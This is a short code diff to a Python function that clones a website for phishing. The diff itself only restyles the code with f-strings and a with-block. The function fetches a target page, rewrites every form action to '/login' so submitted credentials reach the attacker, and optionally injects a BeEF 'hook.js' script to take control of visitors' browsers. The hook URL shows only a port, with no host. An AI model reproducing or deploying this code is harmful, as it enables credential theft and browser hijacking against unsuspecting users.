@@ -4,14 +4,14 @@ import os
 
 # CLONING FUNCTIONS --------------------------------------------------------------------------------------------
 def clone(url, user_agent, beef):
-    try:        
+    try:
         u = url.replace('://', '-')
-        q = 'templates/fake/{}/{}'.format(user_agent, u)
+        q = f'templates/fake/{user_agent}/{u}'
         os.makedirs(q, exist_ok=True)
-        temp_ind_path = 'templates/fake/{}/{}/index.html'.format(user_agent, u)
+        temp_ind_path = f'templates/fake/{user_agent}/{u}/index.html'
         headers = {'User-Agent': user_agent}
         r = requests.get(url, headers=headers)
-        html = r.text        
+        html = r.text
         old_regular = re.findall(r'action="([^ >"]*)"',html)
         new_regular = '/login'
         for r in old_regular:         
@@ -20,9 +20,8 @@ def clone(url, user_agent, beef):
         if beef == 'yes':
             inject = '<script src=":3000/hook.js" type="text/javascript"></script></body>'
             html = html.replace("</body>", inject)
-        new_html = open(temp_ind_path, 'w')
-        new_html.write(html.encode('ascii', 'ignore').decode('ascii'))
-        new_html.close()
+        with open(temp_ind_path, 'w') as new_html:
+            new_html.write(html.encode('ascii', 'ignore').decode('ascii'))
     except:
         pass
 #--------------------------------------------------------------------------------------------------------------------
